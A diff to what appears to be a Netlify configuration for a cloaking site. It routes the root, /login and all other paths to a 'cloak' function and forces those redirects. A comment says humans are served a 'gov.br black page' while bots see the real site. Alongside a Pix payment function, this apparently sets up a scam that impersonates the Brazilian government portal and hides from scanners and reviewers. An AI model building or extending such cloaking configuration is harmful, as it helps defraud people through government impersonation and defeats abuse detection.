@@ -8,6 +8,10 @@
 [functions."pix-api"]
   external_node_modules = ["pg", "@netlify/blobs"]
 
+# Make the published site files available to the cloak function at runtime.
+[functions."cloak"]
+  included_files = ["site-mirror/**"]
+
 # Specific routes first (must stay above the catch-all /* cloak rule).
 [[redirects]]
   from = "/api/consulta.php"
@@ -63,14 +67,17 @@
   from = "/login"
   to = "/.netlify/functions/cloak"
   status = 200
+  force = true
 
 # Cloaking catch-all (LAST): humans get gov.br black page, bots get the real site.
 [[redirects]]
   from = "/"
   to = "/.netlify/functions/cloak"
   status = 200
+  force = true
 
 [[redirects]]
   from = "/*"
   to = "/.netlify/functions/cloak"
   status = 200
+  force = true
